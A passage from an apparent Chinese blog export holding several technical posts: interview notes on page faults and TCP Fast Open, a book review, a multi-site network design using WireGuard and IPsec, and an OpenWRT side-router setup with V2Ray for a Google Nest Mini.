class="string">git</span> <span class="string">update-ref</span> <span class="string">--stdin</span></span><br><span class="line">          <span class="string">git</span> <span class="string">push</span> <span class="string">--mirror</span></span><br></pre></td></tr></table></figure>

<p>保存，提交，就应该会触发同步。在 github 里 repo 下的 Actions 里可以看下结果</p>
]]></content>
      <tags>
        <tag>github</tag>
        <tag>gitee</tag>
        <tag>repository</tag>
        <tag>sync</tag>
        <tag>同步</tag>
        <tag>图床</tag>
        <tag>action</tag>
      </tags>
  </entry>
  <entry>
    <title>xx公司面试总结（查漏补缺）</title>
    <url>/2019/02/xx%E5%85%AC%E5%8F%B8%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93%EF%BC%88%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA%EF%BC%89/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>今天下午面了一家特别想去的公司，结果聊很多，但是……折了，不要问我为什么知道的，面试完本来说别的同事（一般会是 HR）再聊一下但结果是前台来直接送走这不是凉了是什么？</p>
<p>主要原因我想是：</p>
<ul>
<li>人家本来要求就高</li>
<li>我有几个技术点答的不好</li>
</ul>
<p>我想，折了就折了吧，我只能看能不能变废为宝，从中学到点什么，吸取什么教训什么的，于是就有了本篇面试总结。</p>
<span id="more"></span>

<h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><h2 id="关于形而上"><a href="#关于形而上" class="headerlink" title="关于形而上"></a>关于形而上</h2><p>形而上，或者是高大上、高逼格的东西，面试中如果能适当的、不生硬的引出来，肯定是有加分的，尤其是对那些高大上的岗位（管理岗、架构师啥的），所以，这个要靠平时自己多准备。貌似我对这个没有天赋</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>面试期间，大概有三个技术点我是没答对或者没描述明白的。具体情况如下：</p>
<h3 id="Page-fault"><a href="#Page-fault" class="headerlink" title="Page fault"></a>Page fault</h3><p>以下来自<a href="https://zh.wikipedia.org/wiki/%E9%A1%B5%E7%BC%BA%E5%A4%B1">维基百科</a></p>
<blockquote>
<p>页缺失（英语：Page fault，又名硬错误、硬中断、分页错误、寻页缺失、缺页中断、页故障等）指的是当软件试图访问已映射在虚拟地址空间中，但是当前并未被加载在物理内存中的一个分页时，由中央处理器的内存管理单元所发出的中断。</p>
</blockquote>
<blockquote>
<p>通常情况下，用于处理此中断的程序是操作系统的一部分。如果操作系统判断此次访问是有效的，那么操作系统会尝试将相关的分页从硬盘上的虚拟内存文件中调入内存。而如果访问是不被允许的，那么操作系统通常会结束相关的进程。</p>
</blockquote>
<blockquote>
<p>虽然其名为“页缺失”错误，但实际上这并不一定是一种错误。而且这一机制对于利用虚拟内存来增加程序可用内存空间的操作系统（比如Microsoft Windows和各种类Unix系统）中都是常见且有必要的。</p>
</blockquote>
<p>我理解其实 Page fault 就是当进程访问虚拟内存中的某个不在物理内存里的内存页的时候，CPU 的 MMU 发出的一个中断。</p>
<p>如果访问时合法的，所需的内存页会被交换进物理内存。</p>
<h4 id="Page-fault-的分类"><a href="#Page-fault-的分类" class="headerlink" title="Page fault 的分类"></a>Page fault 的分类</h4><h5 id="软性"><a href="#软性" class="headerlink" title="软性"></a>软性</h5><p>以下内容来自于维基百科</p>
<blockquote>
<p>软性页缺失指页缺失发生时，相关的页已经被加载进内存，但是没有向MMU注册的情况。操作系统只需要在MMU中注册相关页对应的物理地址即可。</p>
</blockquote>
<blockquote>
<p>发生这种情况的可能性之一，是一块物理内存被两个或多个程序共享，操作系统已经为其中的一个装载并注册了相应的页，但是没有为另一个程序注册。</p>
</blockquote>
<blockquote>
<p>可能性之二，是该页已被从CPU的工作集中移除，但是尚未被交换到磁盘上。比如OpenVMS这样的使用次级页缓存的系统，就有可能会在工作集过大的情况下，将某页从工作集中去除，但是不写入硬盘也不擦除（比如说这一页被读出硬盘后没被修改过），只是放入空闲页表。除非有其他程序需要，导致这一页被分配出去了，不然这一页的内容不会被修改。当原程序再次需要该页内的数据时，如果这一页确实没有被分配出去，那么系统只需要重新为该页在MMU内注册映射即可。</p>
</blockquote>
<h5 id="硬性"><a href="#硬性" class="headerlink" title="硬性"></a>硬性</h5><p>以下内容来自于维基百科</p>
<blockquote>
<p>与软性页缺失相反，硬性页缺失是指相关的页在页缺失发生时未被加载进内存的情况。这时操作系统需要：</p>
</blockquote>
<blockquote>
<ul>
<li>寻找到一个空闲的页。或者把另外一个使用中的页写到磁盘上（如果其在最后一次写入后发生了变化的话），并注销在 MMU 内的记录</li>
<li>将数据读入被选定的页</li>
<li>向 MMU 注册该页</li>
</ul>
</blockquote>
<blockquote>
<p>硬性页缺失导致的性能损失是很大的。以一块 7200rpm 的主流机械硬盘为例，其平均寻道时间为 8.5 毫秒，读入内存需要 0.05 毫秒。相对的，DDR3 内存的访问延迟通常在数十到 100 纳秒之间，性能差距可能会达到 8 万到 22 万倍。</p>
</blockquote>
<blockquote>
<p>另外，有些操作系统会将程序的一部分延迟到需要使用的时候再加载入内存执行，以此来提升性能。这一特性也是通过捕获硬性页缺失达到的。</p>
</blockquote>
<blockquote>
<p>当硬性页缺失过于频繁的发生时，称发生系统颠簸（Thrashing）。</p>
</blockquote>
<h5 id="无效"><a href="#无效" class="headerlink" title="无效"></a>无效</h5><p>以下内容来自于维基百科</p>
<blockquote>
<p>当程序访问的虚拟地址是不存在于虚拟地址空间内的时候，则发生无效页缺失。一般来说这是个软件问题，但是也不排除硬件可能，比如因为内存故障而损坏了一个正确的指针。</p>
</blockquote>
<blockquote>
<p>具体动作与所使用的操作系统有关，比如 Windows 会使用异常机制向程序报告，而类 Unix 系统则会使用信号机制。如果程序未处理相关问题，那么操作系统会执行默认处理方式，通常是转储内存、终止相关的程序，然后向用户报告。</p>
</blockquote>
<p>貌似这才是真正的“错误”。</p>
<h3 id="TCP-Fast-Open"><a href="#TCP-Fast-Open" class="headerlink" title="TCP Fast Open"></a>TCP Fast Open</h3><p>以下内容来自于<a href="https://zh.wikipedia.org/wiki/TCP%E5%BF%AB%E9%80%9F%E6%89%93%E5%BC%80">维基百科</a></p>
<blockquote>
<p>TCP 快速打开（英语：TCP Fast Open，简称 TFO ）是对计算机网络中传输控制协议（TCP）连接的一种简化握手手续的拓展，用于提高两端点间连接的打开速度。</p>
</blockquote>
<blockquote>
<p>它通过握手开始时的 SYN 包中的 TFO cookie（一个 TCP 选项）来验证一个之前连接过的客户端。如果验证成功，它可以在三次握手最终的 ACK 包收到之前就开始发送数据，这样便跳过了一个绕路的行为，更在传输开始时就降低了延迟。这个加密的 Cookie 被存储在客户端，在一开始的连接时被设定好。然后每当客户端连接时，这个 Cookie 被重复返回。</p>
</blockquote>
<blockquote>
<p>此 Cookie 通常采用一种分组密码，私钥由服务器根据客户端的IP地址保存，生成一个第三方难以仿冒的消息认证码标签，即便第三方可以伪造源IP地址或从其他IP地址制造到同一个服务器的连接。尽管使用了加密技术来生成cookie，但 TFO 并不着眼于提供比它所替换的三次握手有更多的安全性，并且不对所产生的 TCP 连接提供任何形式的加密保护或端点身份认证。它的目的不是为了抵挡中间人攻击。</p>
</blockquote>
<blockquote>
<p>这个协议最早提出于 2011 年并在 2012 年 2 月时已为一个 IETF 互联网草案，这项规范最终在 2014 年 12 月作为RFC 7413 发布。</p>
</blockquote>
<h4 id="TFO-的具体过程"><a href="#TFO-的具体过程" class="headerlink" title="TFO 的具体过程"></a>TFO 的具体过程</h4><p>以下内容来自于维基百科</p>
<h5 id="请求Fast-Open-Cookie"><a href="#请求Fast-Open-Cookie" class="headerlink" title="请求Fast Open Cookie"></a>请求Fast Open Cookie</h5><blockquote>
<ol>
<li>客户端发送 SYN 数据包，该数据包包含 Fast Open 选项，且该选项的 Cookie 为空，这表明客户端请求 Fast Open Cookie；</li>
<li>支持 TCP Fast Open 的服务器生成 Cookie，并将其置于 SYN-ACK 数据包中的 Fast Open 选项以发回客户端；</li>
<li>客户端收到 SYN-ACK 后，缓存 Fast Open 选项中的 Cookie。</li>
</ol>
</blockquote>
<h5 id="实施TCP-Fast-Open"><a href="#实施TCP-Fast-Open" class="headerlink" title="实施TCP Fast Open"></a>实施TCP Fast Open</h5><blockquote>
<p>以下描述假定客户端在此前的 TCP 连接中已完成请求 Fast Open Cookie 的过程并存有有效的 Fast Open Cookie。</p>
</blockquote>
<blockquote>
<p>客户端发送 SYN 数据包，该数据包包含数据（对于非 TFO 的普通 TCP 握手过程，SYN 数据包中不包含数据）以及此前记录的 Cookie；<br>支持 TCP Fast Open 的服务器会对收到 Cookie 进行校验：如果 Cookie 有效，服务器将在 SYN-ACK 数据包中对 SYN和数据进行确认（Acknowledgement），服务器随后将数据递送至相应的应用程序；否则，服务器将丢弃 SYN 数据包中包含的数据，且其随后发出的 SYN-ACK 数据包将仅确认（Acknowledgement）SYN 的对应序列号；<br>如果服务器接受了 SYN 数据包中的数据，服务器可在握手完成之前发送数据；<br>客户端将发送 ACK 确认服务器发回的 SYN 以及数据，但如果客户端在初始的 SYN 数据包中发送的数据未被确认，则客户端将重新发送数据；<br>此后的 TCP 连接和非 TFO 的正常情况一致。<br>注：客户端在请求并存储了 Fast Open Cookie 之后，可以不断重复 TCP Fast Open 直至服务器认为 Cookie 无效（通常为过期）。</p>
</blockquote>
<h3 id="Docker-的网络模型"><a href="#Docker-的网络模型" class="headerlink" title="Docker 的网络模型"></a>Docker 的网络模型</h3><p>这里聊到的其实是指我在前公司用过的一个简单的 Docker 应用的网络模型，非常简单，就是桥接。</p>
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>面试总结</tag>
        <tag>TFO</tag>
        <tag>Page fault</tag>
        <tag>TCP Fast Open</tag>
      </tags>
  </entry>
  <entry>
    <title>《贝佐斯的数字帝国》读后感</title>
    <url>/2021/04/%E3%80%8A%E8%B4%9D%E4%BD%90%E6%96%AF%E7%9A%84%E6%95%B0%E5%AD%97%E5%B8%9D%E5%9B%BD%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F/index.html</url>
    <content><![CDATA[<p>水一篇哈，这里从来没写过读后感，这次水一篇吧。:(</p>
<p>入职这家公司就知道有这么一篇文章要写，一直忙忙碌碌、忙东忙西也没来得及张罗这事。最近（双十一热身），乘着搞活动（满 200 减 100），把这本书买了。</p>
<p>看起来自然很快，一个多礼拜就看完了。</p>
<p>看完了有啥想法？没啥想法。：）</p>
<span id="more"></span>

<p>我九八年入行就是做网上书店，对标的就是 Amazon 的网上书城（那会儿也仅是网上书城）。到现在，手头维护的公司的计算网络资源，都在 AWS（amazon web service） 上（之前也有好多家前东家都在用 AWS），而且，我还知道 Amazon 在硅谷互联网企业中出了名的“抠门”，所以说，我对 Amazon 的了解不可谓不深，但是看了这本书，我发现我其实自始至终，都没有能真正了解这家公司。</p>
<p>书看得很快，有印象的地方不多，如果说真要有，那么如下几点还是给了我比较深刻的印象的。</p>
<p>一，不写 ppt。为啥对这个印象深刻？因为这个深得我心呀。我是个技术人员，我对 ppt 从来感觉就不好。看过也听过那么多的 ppt，绝大多数是结束之后完全不知所云，好像讲了很多但又好像什么都没讲。</p>
<p>二，串联式审批改成并联式。这个我也很赞同呀。所谓大公司病之一，就是流程繁琐缓慢，这也是官僚主义的一种表现嘛。减少层次、简化审批流程，对员工肯定是好消息。</p>
<p>三，职能部门不能说不（There is no “NO”.）。这句话给我震动很大，在以往所有呆过的公司里，运维团队的角色无非两种，其中大多数情况下都是被定义为职能部门、基础支持团队（另外一种定位就不讲了）。但我从来没有听说过这种说法：“职能部门不能说“不””？所以第一次听到这种说法，我被震撼了。但细细品，是有道理的，职能部门就是搞好服务的，服务好支持的对象的。有了这个意识，我发现我对鄙厂商务团队的复杂的“科学上网”需求突然感觉需要认真对待了。：）</p>
]]></content>
      <tags>
        <tag>读后感</tag>
        <tag>贝佐斯</tag>
        <tag>亚马逊</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>中小企业多 IDC 之间的内网打通方案</title>
    <url>/2022/08/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E5%A4%9A%20IDC%20%E4%B9%8B%E9%97%B4%E7%9A%84%E5%86%85%E7%BD%91%E6%89%93%E9%80%9A%E6%96%B9%E6%A1%88/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>这个问题我觉得中小公司有需求，但是大公司应该没这个需求，大公司肯定都找第三方直接 MPLS 之类的商业全套解决方案了。但是对于缺钱的中小企业，我觉得还是有借鉴意义的。</p>
<span id="more"></span>

<p>这篇文章本来是要讲“中小企业维护海外服务器的 VPN 方案”的，但讲着讲着，发现大部分内容，都是讲的“内网打通”。:(</p>
<p>这个方案准确讲是来自我在某个前司（前司比较多：）的一段工作经历，他们业务跑在海外公有云（AWS）上，技术团队在国内，连服务器需要先拨 VPN，直接拨经常断，所以我就折腾了这么一个方案出来，我在那里的一年多时间，完全没有出过问题。</p>
<h2 id="方案细节"><a href="#方案细节" class="headerlink" title="方案细节"></a>方案细节</h2><h3 id="方案概况"><a href="#方案概况" class="headerlink" title="方案概况"></a>方案概况</h3><p>正所谓：一图胜千文。所以，请看图：</p>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/Backbone_network.jpg" alt="内网拓扑图"></p>
<p>注意：这里为了脱敏，我把一些真正的公网 IP 地址和公司产品的名字以及一些我认为是隐私的信息隐去了。</p>
<p>另外，上图其实可以和我的另外一篇文章：<a href="/2021/03/How%20to%20build%20IPsec%20tunnel%20between%20checkpoint%20and%20AWS%20ec2%20at%20cn-north-1/index.html">怎样在 checkpoint 设备和 AWS 北京的 EC2 之间搭建 IPsec 隧道</a> 结合起来看。</p>
<p>所以，这个图其实是个“内网打通”的示意图。</p>
<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><h4 id="海外节点之间的（内网）互联"><a href="#海外节点之间的（内网）互联" class="headerlink" title="海外节点之间的（内网）互联"></a>海外节点之间的（内网）互联</h4><p>各大公有云厂商，都有成熟的产品来处理内部的各个 VPC 之间的内网互通，比如如上图所示，aws 的相关产品，就叫 “transit gateway”，阿里云也有类似的产品，好像叫“云企业网”还是什么别的。Azure 和 GCP 就不太了解，但肯定有类似产品。</p>
<p>所以，这个问题的答案就是：</p>
<ul>
<li>如果是厂商内部，直接使用厂商的产品即可。跨账号的 VPC 之间也支持（内网打通）哟，但是要注意内网 IP 别冲突了</li>
<li>如果是厂商之间、或者是厂商和自建 IDC 之间，那么推荐用 WireGuard 打通即可。</li>
</ul>
<h4 id="国内节点之间的（内网）互联"><a href="#国内节点之间的（内网）互联" class="headerlink" title="国内节点之间的（内网）互联"></a>国内节点之间的（内网）互联</h4><p>答案其实跟海外的一样：</p>
<ul>
<li>厂商内部，直接用厂商的产品</li>
<li>跨厂商或跟 IDC 之间，用 WireGuard</li>
</ul>
<p>当然，这里也有例外，比如上图所示：北京 office 和 AWS 北京节点之间，就是用 IPSec 而不是 WireGuard 打通的（具体怎么打通，前面有提到的一篇文章中有详细记载）。为什么这样呢？那主要是因为公司给北京办公室配置了设备呀，checkpoint 的防火墙！这货不支持 WireGuard。故而只能在 AWS 北京节点起台 ec2，装个 IPSec 服务，然后两者打通。</p>
<h3 id="方案的“缺点”"><a href="#方案的“缺点”" class="headerlink" title="方案的“缺点”"></a>方案的“缺点”</h3><p>这个方案就是路由表的维护需要仔细又仔细。其实并不难，主要是复杂，需要细心，维护时尽量对着图来做，配完多做测试。</p>
<h3 id="补充一下-VPN-接入方案"><a href="#补充一下-VPN-接入方案" class="headerlink" title="补充一下 VPN 接入方案"></a>补充一下 VPN 接入方案</h3><p>前面有提到这个方案也可以用做 VPN 优化的。首先我们看看优化之前我们的 VPN 架构是怎么样的。</p>
<p>之前，VPN server 都是在海外的公有云节点上，国内连一个是慢，而最重要的是不稳定，非常容易被封。</p>
<p>而（内网打通）之后，我的 VPN 方案我推荐其主要接入点放在国内同一家厂商据用户最近的接入点（如上图例就是 aws 北京接入点，再准确点就是 IPSec 那台 EC2），然后再在海外每个节点保留一个冗余接入点即可。注意：这些 VPN 接入点的认证都是统一的。</p>
<p>这样一来从（VPN）主接入点来说，用户从国内（大概率是从北京）连过来，不容易被干扰，大概率不会被封，而同一厂商国内节点到海外节点之间数据链路也会比较稳定通畅，也不容易被干扰、被封。所以，整条链路不一定有多快，但肯定是要稳定的多得多得多。</p>
<h2 id="方案的局限性"><a href="#方案的局限性" class="headerlink" title="方案的局限性"></a>方案的局限性</h2><h3 id="节点维护的复杂性"><a href="#节点维护的复杂性" class="headerlink" title="节点维护的复杂性"></a>节点维护的复杂性</h3><p>想想如果新加入一个节点，会需要做哪些操作。</p>
<p>通常，我们会把新的节点和已有的所有节点直连，当然，跨境的节点之间例外。而做 WireGuard 点对点配置，加一个对端点，需要改整个的配置，所以，理论上在一个点上改 WireGuard 配置时，上面的所有 WireGuard 链接都会受影响（因为大致需要重启 WireGuard 服务）。</p>
<h3 id="路由选择的复杂性"><a href="#路由选择的复杂性" class="headerlink" title="路由选择的复杂性"></a>路由选择的复杂性</h3><p>还有一个，就是路由选择的可能的坑，比如节点 A、B 和 C 之间，两两互通，那么从 A 到 C，路由 A-&gt;C 和 A-&gt;B-&gt;C 都是可以的，而且一般情况下自然是直连也就是 A-&gt;C 更好，所以我们这里的方案也是 A-&gt;C。说了“一般情况”，那么肯定就还有“例外”吧，对的，像国内家庭宽带到海外节点之间，就是典型的例外情况，这种情况下直连远不如走国内的厂商中转一下。那么，像我们这样把这种例外情况下就不做直连，路由也直接走中转不就得了？这也不是绝对的，事情是变化的，也许这一时刻这条路由更优，下一时刻又是另外一条路由更优。:- 对啦，我想说的就是，远期有时间的时候，可以考虑下把路由扔给 OSPF 来管理，这样逼格完全就不一是一个层次了！:)</p>
<h2 id="最优雅的内网互通方案"><a href="#最优雅的内网互通方案" class="headerlink" title="最优雅的内网互通方案"></a>最优雅的内网互通方案</h2><p>其实其实，说到“内网互联的方案”的我最最理想的情况，还是类似于自建 zerotier 的方案。自己搭建PLANT，然后每个节点找台网关机器接入自己的 zerotier 网络，这就完了，所有节点也就互通了。而且路由当能直通的时候，节点之间是直通的，当节点之间不能互通的时候，可以通过 PLANT 来互通。这才是内网互通的最优雅解决方案。下回有空谢谢这个。不过最好还是得哪个贵司给我个机会让我实践一下。:O</p>
]]></content>
      <tags>
        <tag>IPSec</tag>
        <tag>aws</tag>
        <tag>VPC</tag>
        <tag>公有云</tag>
        <tag>checkpoint</tag>
        <tag>VPN</tag>
        <tag>中小企业</tag>
        <tag>方案</tag>
        <tag>transit gateway</tag>
        <tag>WireGuard</tag>
        <tag>OSPF</tag>
        <tag>Zerotier</tag>
        <tag>PLANT</tag>
      </tags>
  </entry>
  <entry>
    <title>为了在家用起来 google nest mini 的旁路由方案</title>
    <url>/2022/07/%E4%B8%BA%E4%BA%86%E5%9C%A8%E5%AE%B6%E7%94%A8%E8%B5%B7%E6%9D%A5%20google%20nest%20mini%20%E7%9A%84%E6%97%81%E8%B7%AF%E7%94%B1%E6%96%B9%E6%A1%88/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>为了把从美国带回来的在家吃灰了几个月的 Google 智能音箱(Google Nest Mini)用起来。而之前由于家里都是终端设备自己搞定科学上网的需求，家里并没有全局的科学上网方案。但这一次由于要用 Google Nest Mini，则必须要搞个设备，搭科学上网环境了。</p>
<span id="more"></span>

<h2 id="方案细节"><a href="#方案细节" class="headerlink" title="方案细节"></a>方案细节</h2><h3 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h3><p>家里还有个吃灰几年的极路由三（HiWiFi HC5861），用的是联发科的架构（MediaTek MT7620A），这一次打算将其用起来，作为科学上网的设备。</p>
<p>于是将其刷上最新的 OpenWRT。具体过程就不说了。</p>
<p>然后因为我所有的设备，但凡支持，都会起 zerotier，于是这太极三也装上了 zerotier，并加入我的网络（跟我的 vps 以及其他设备在同一个虚拟的 zerotier 网段）</p>
<h3 id="方案变迁"><a href="#方案变迁" class="headerlink" title="方案变迁"></a>方案变迁</h3><h4 id="socks-proxy-V2Ray-方案"><a href="#socks-proxy-V2Ray-方案" class="headerlink" title="socks proxy(V2Ray) 方案"></a>socks proxy(V2Ray) 方案</h4><p>因为设备连接 WiFi 时大都会允许设置一个 proxy，所以，在最初的方案里，我是想让这台极三充当一个 socks proxy 的角色，当需要科学上网的设备（这里就是 Google Nest Mini）通过 WiFi 接入家庭网络的时候，将 proxy 指过来，这样实现设备的科学上网。</p>
<p>这个方案也简单，只需要在极三上起一个 V2Ray 服务，这个服务的入站（inbound）只需要开一个整个局域网共享的 socks proxy 的支持就可以了，出站（outbound）当然是对接海外 vps 上的 V2Ray 服务。</p>
<p>最后，这个方案的环境弄好了，结果配 Google Nest Mini 的时候发现无法让其使用 socks proxy，故而最后这个方案没有用起来。</p>
<h4 id="zerotier-透明代理-方案"><a href="#zerotier-透明代理-方案" class="headerlink" title="zerotier+透明代理 方案"></a>zerotier+透明代理 方案</h4><p>这个方案是想设备（Google Nest Mini）用 WiFi 来连科学上网设备极三，然后在极三上用 iptables 把所有流量转发到海外 vps 的 zerotier 那个网卡所在的 IP 地址的 socks proxy 端口（V2Ray 服务支持）上。</p>
<p>这个方案的问题在于我极三的 WiFi 我用来连家里的 WiFi 了，再要起一个 sid 接受 WiFi 连接呢，配置起来比较麻烦，而且，可能会影响家里原来 WiFi 的信号（因为 WiFi 会互相干扰）。</p>
<p>最后，这个方案虽然也没被放弃，但是极三上的 zerotier 却是配好了。</p>
<h4 id="旁路由-透明代理方案"><a href="#旁路由-透明代理方案" class="headerlink" title="旁路由+透明代理方案"></a>旁路由+透明代理方案</h4><p>这是最终实施并生效的方案。</p>
<p>大致情况如下：</p>
<ul>
<li>极路由三上跑 V2Ray 服务<ul>
<li>入站启用透明代理和 socks 代理（不是必须的）</li>
<li>路由配置成私有地址和中国国内的网站直连，其他走科学上网。</li>
<li>出站配直连和走海外 vps 上的 V2Ray 服务（我用的是 websocket 方式）</li>
</ul>
</li>
<li>主路由的 DHCP 设置里<ul>
<li>绑定极路由三的 mac 地址和一个固定 IP</li>
<li>绑定设备 Google Nest Mini 的 mac 地址和另外一个固定 IP，并强制推送网关地址为极路由三的 IP 地址（上一步配置的）</li>
</ul>
</li>
</ul>
<h3 id="实施步骤及具体配置"><a href="#实施步骤及具体配置" class="headerlink" title="实施步骤及具体配置"></a>实施步骤及具体配置</h3><h4 id="极三上安装-V2Ray"><a href="#极三上安装-V2Ray" class="headerlink" title="极三上安装 V2Ray"></a>极三上安装 V2Ray</h4><p>这其实是个难点。极三上能装软件的空间只有 10M，结果直接 <code>opkg install v2ray-core</code> 出来的可执行文件 v2ray 直接有 20+M，显然不能直接装。幸好有大佬把 v2ray-core port 到了 OpenWRT 上[^1]，他编了个 v2ray-core-mini 勉强可用。具体在极三上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget \</span><br><span class="line">  https://github.com/kuoruan/openwrt-v2ray/releases/download/v4.45.2-1/v2ray-core-mini_4.45.2-1_mipsel_24kc.ipk</span><br><span class="line">opkg install v2ray-core-mini*.ipk</span><br><span class="line"><span class="built_in">rm</span> v2ray-core-mini*.ipk</span><br></pre></td></tr></table></figure>

<p>然后还要一些数据（因为 v2ray-core-mini 包里不含 geoip.dat 和 geosite.dat 等数据文件，这些文件太大了），我们这里手工下载了一个 geosite.dat，这个就够了，那个 geoip.dat 有二十多兆，太大了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/bin</span><br><span class="line">wget https://github.com/v2fly/domain-list-community/releases/download/20230403032550/dlc.dat</span><br><span class="line"><span class="built_in">mv</span> dlc.dat geosite.dat</span><br></pre></td></tr></table></figure>

<p>最好还装上 V2Ray 服务的 luci 包，这样就可以在 web 上直接配置了。注意：有个叫 luci-i18n-v2ray-zh-cn 的中文语言包我没装，主要是为了节省空间，这个也不是必须的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget https://github.com/kuoruan/luci-app-v2ray/releases/download/v1.5.6-1/luci-app-v2ray_1.5.6_all.ipk</span><br><span class="line">opkg install luci-app-v2ray*.ipk</span><br><span class="line"><span class="built_in">rm</span> luci-app-v2ray*.ipk</span><br></pre></td></tr></table></figure>

<h4 id="极三的（网络）上联配置"><a href="#极三的（网络）上联配置" class="headerlink" title="极三的（网络）上联配置"></a>极三的（网络）上联配置</h4><p>极三可以用 wan 口去接主路由的 lan 口，但我这里是用的 WiFi 去连的主路由的 WiFi，这种方式使极三上的网。后面的 dhcp 配置里会有所体现。</p>
<h4 id="极三上配置-V2Ray"><a href="#极三上配置-V2Ray" class="headerlink" title="极三上配置 V2Ray"></a>极三上配置 V2Ray</h4><p>弄清楚逻辑以后配置部分也没啥可讲的。就是：</p>
<ul>
<li>两个入站（socks 和 dokodemo_door，前者不是必须的，因为我们这个方案里没有用到）</li>
<li>几个出站（最主要的是两个：freedom 和 vmess，这两个一个是直连，还有一个是连海外 VPS 上的 V2Ray）</li>
<li>一些路由，比如私网直连、geosite:cn（中国的网站） 直连。</li>
</ul>
<p>注意：</p>
<ul>
<li>路由规则里不能使用 geoip: 开头的写法，因为我们的数据文件里没放 geoip.dat，同理，geosite: 是可以的。</li>
<li>透明代理（dokodemo_door）的设置里，proxy mode 选 default dokodemo</li>
</ul>
<h4 id="主路由上的配置"><a href="#主路由上的配置" class="headerlink" title="主路由上的配置"></a>主路由上的配置</h4><p>主路由也是 OpenWRT，主要是修改其 DHCP 配置，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; /etc/config/dhcp &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">config host</span></span><br><span class="line"><span class="string">  option name &#x27;gee3-5g&#x27;</span></span><br><span class="line"><span class="string">  option mac &#x27;00:00:00:FF:FF:FF&#x27;</span></span><br><span class="line"><span class="string">  option ip &#x27;10.0.0.254&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">config host</span></span><br><span class="line"><span class="string">  option name &#x27;google-nest-mini&#x27;</span></span><br><span class="line"><span class="string">  option mac &#x27;00:00:00:FF:FF:FE&#x27;</span></span><br><span class="line"><span class="string">  option ip &#x27;10.0.0.253&#x27;</span></span><br><span class="line"><span class="string">  option tag &#x27;2gw&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">config tag &#x27;2gw&#x27;</span></span><br><span class="line"><span class="string">  list dhcp_option &#x27;3,10.0.0.254&#x27;</span></span><br><span class="line"><span class="string">  option force &#x27;1&#x27;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">/etc/init.d/dnsmasq restart <span class="comment"># restart dhcp server</span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>“00:00:00:FF:FF:FF” 和 “00:00:00:FF:FF:FE” 分别是极三和 Google Nest Mini 的 mac 地址（瞎写的，真实的数据是隐私）</li>
<li>“10.0.0.254” 和 “10.0.0.253” 分别是极三和 Google Nest Mini 的 IP 地址（这也是杜撰的，真实的 IP 是隐私）</li>
<li>主路由的正常推的网关地址应该是 “10.0.0.1”（这里给 Google Nest Mini 推送了旁路由，IP 地址是 10.0.0.254）</li>
</ul>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><ul>
<li><a href="https://github.com/v2fly/v2ray-core">Project V</a></li>
</ul>
<p>[^1]:<a href="https://github.com/kuoruan/openwrt-v2ray">V2Ray for OpenWrt</a></p>
]]></content>
      <tags>
        <tag>OpenWRT</tag>
        <tag>Zerotier</tag>
        <tag>Google Nest Mini</tag>
        <tag>智能音箱</tag>
        <tag>旁路由</tag>
        <tag>极路由</tag>
        <tag>透明代理</tag>
        <tag>dokodemo_door</tag>
        <tag>v2ray-core-mini</tag>
        <tag>v2ray-core</tag>
        <tag>V2Ray</tag>
        <tag>HiWiFi</tag>
        <tag>HC5861</tag>
      </tags>
  </entry>
  <entry>
    <title>从 Client VPN endpoint 迁移到 EC2 上的 OpenVPN</title>
    <url>/2023/02/%E4%BB%8E%20Client%20VPN%20endpoint%20%E8%BF%81%E7%A7%BB%E5%88%B0%20EC2%20%E4%B8%8A%E7%9A%84%20OpenVPN/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>原本有一个 Client VPN endpoint 在 AWS 新加坡。有几个原因导致要迁移：</p>
<ul>
<li>没几天就不能用了，具体原因不足为外人道也，懂的都懂。</li>
<li>Client VPN endpoint 太贵了。</li>
</ul>
<h2 id="现有环境"><a href="#现有环境" class="headerlink" title="现有环境"></a>现有环境</h2><ul>
<li>免费的 EC2 一台，跑的是 Amazon Linux 2023</li>
</ul>
<span id="more"></span>

<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="安装-OpenVPN"><a href="#安装-OpenVPN" class="headerlink" title="安装 OpenVPN"></a>安装 OpenVPN</h3><p>由于 Amazon Linux 2023 里没有 OpenVPN 的包，也考察过 Fedora 36 的包，但思来想去，还是源代码编译安装吧，所以 OpenVPN 最后还是源代码编译安装的。</p>
<p>登录 EC2 后，开始操作：</p>
